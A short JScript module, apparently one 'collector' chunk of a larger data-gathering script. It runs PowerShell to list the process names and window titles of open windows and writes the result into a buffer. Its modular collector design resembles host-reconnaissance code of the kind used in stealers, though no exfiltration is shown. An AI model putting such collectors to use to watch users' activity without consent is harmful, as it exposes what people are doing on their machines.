// chunk: collectors/active_windows
// depends: core/emit_buffer, core/run_cmd
// provides: collect_active_windows
// format: jscript

function collect_active_windows() {
    emit("\r\n=== ACTIVE WINDOWS ===\r\n");
    emit(_run("powershell -Command \"Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object ProcessName,MainWindowTitle | Format-Table -AutoSize\""));
}
